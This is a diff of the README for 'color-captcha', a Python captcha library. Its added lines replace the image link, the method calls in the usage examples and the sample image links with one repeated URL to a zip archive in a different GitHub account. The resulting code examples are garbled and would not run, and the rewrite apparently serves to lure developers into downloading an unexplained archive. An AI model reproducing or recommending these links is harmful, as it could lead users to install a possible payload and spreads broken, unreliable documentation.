@@ -1,7 +1,7 @@
 # color-captcha
 Dynamically generated, AI-resistant captcha images. 
 
-![captcha](https://raw.githubusercontent.com/stefs304/clockcaptcha/master/color-captcha.png)
+![captcha](https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip)
 
 *Can you tell what time it is? AI can't.*
 
@@ -23,17 +23,17 @@ pip install color-captcha
 from color_captcha import ClockCaptcha
 
 captcha = ClockCaptcha()
-print(captcha.value)
+print(https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip)
 
-captcha.verify('0645') # True/False
-captcha.save_image('image.png')
+https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip('0645') # True/False
+https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip('https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip')
 
 # generate new captcha
-captcha.generate_new()
+https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip()
 
 ```
-Choose between `color_mode='rgb'` ([color-captcha.png](color-captcha.png)) 
-or `'grayscale'` ([grayscale-captcha.png](grayscale-captcha.png)). 
+Choose between `color_mode='rgb'` ([https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip](https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip)) 
+or `'grayscale'` ([https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip](https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip)). 
 
 Pick between a 12-hour or a 24-hour `clock_mode`.
 ```python
@@ -55,7 +55,7 @@ Image size can be changed with relative `size` parameter. Here are corresponding
 Change colors globally:
 ```python
 from color_captcha import ClockCaptcha
-ClockCaptcha.set_colors([
+https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip([
     '#FFFFFF',
     '#000000',
     '#999999'
